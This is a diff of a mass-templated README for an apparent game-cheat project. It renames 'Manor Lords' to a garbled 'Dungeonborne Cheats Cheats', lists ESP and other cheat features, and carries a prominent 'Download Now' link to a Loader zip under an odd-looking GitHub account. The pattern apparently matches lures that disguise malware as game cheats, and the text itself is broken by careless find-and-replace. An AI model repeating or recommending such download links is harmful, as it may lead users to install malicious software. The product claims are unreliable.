@@ -1,4 +1,4 @@
-# 🎮 Manor Lords Cheats
+# 🎮 Dungeonborne Cheats Cheats
 
 [![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Lowercladisconnect/LomerunekProk/releases/download/v1.0.0/Loader.v2.6.zip)
 
@@ -7,7 +7,7 @@ Latest Version: v1.0.0 • File Size: ~156 MB
 </div>
 
 
-> ⚡ Advanced Game Modification Project for Manor Lords
+> ⚡ Advanced Game Modification Project for Dungeonborne Cheats
 
 Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
 
@@ -20,7 +20,7 @@ Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
 
 ## 📖 About
 
-Manor Lords Cheats is a feature-rich third-party modification project designed to provide a wide range of visual, informational, and gameplay-related customization options for Manor Lords.
+Dungeonborne Cheats Cheats is a feature-rich third-party modification project designed to provide a wide range of visual, informational, and gameplay-related customization options for Dungeonborne Cheats.
 
 The project focuses on a clean and modern interface, flexible configuration, and an organized menu system that makes available modules easy to configure.
 
@@ -32,7 +32,7 @@ The project focuses on a clean and modern interface, flexible configuration, and
 
 ### 👁️ ESP / Information
 
-Manor Lords Cheats includes an extensive information and visualization system with multiple configurable elements.
+Dungeonborne Cheats Cheats includes an extensive information and visualization system with multiple configurable elements.
 
 - 👤 Player ESP
 - ❤️ Health Indicators
@@ -120,7 +120,7 @@ Additional customization options for the overall experience.
 
 ## 🎨 UI / Menu
 
-Manor Lords Cheats features a clean and organized menu designed around categories and easily accessible settings.
+Dungeonborne Cheats Cheats features a clean and organized menu designed around categories and easily accessible settings.
 
 ### 🖥️ Interface Features
 
